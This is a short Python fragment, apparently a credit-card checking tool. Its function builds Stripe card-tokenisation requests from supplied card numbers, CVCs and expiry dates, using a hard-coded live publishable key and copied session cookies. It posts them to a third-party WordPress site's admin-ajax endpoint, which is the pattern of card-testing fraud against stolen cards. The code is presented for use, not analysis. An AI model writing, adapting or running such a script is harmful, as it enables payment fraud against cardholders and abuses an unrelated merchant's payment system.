...
def Tele(ccx):
    ...
    data = f'type=card&billing_details[name]=Max&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F4ce67fde21%3B+stripe-js-v3%2F4ce67fde21%3B+card-element&key=pk_live_51JFgfTKqjmzJCbSr9wtxl0XojHckW6m9jJFVUKw1MHDix6dpGRuJAPXV0LRBU5y5r5FmIq8c3EVywaikYyU45Wg600Va8cE1WA'
    ...
    headers = {
        ...
        # 'cookie': '__stripe_mid=ff73cd86-d8f8-498d-be84-e2cfcf7448a49c1297; cmplz_banner-status=dismissed; cmplz_policy_id=14; cmplz_marketing=deny; cmplz_statistics=deny; cmplz_preferences=deny; cmplz_functional=allow; cmplz_consented_services=; __stripe_sid=c9a02c0c-fb79-4d7e-93fa-d0bdc002de7f1d242a; __cf_bm=Erxl2Ye9Z2U6f1bs2iy4T7qaHjZn6FDwDbLDM5Nnz4g-1769570735-1.0.1.1-VVPLMpCY0hrSebhRegVLsf0IGDCEHThGIh8mt_.FNhCkwlaGBRzmcfVUCqq0k_WUugq0ilSopuSjlOdqoBFYCCu6bP7woTDxwA_dD.NsDuw',
    ...
    response = requests.post('https://levcomhub.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
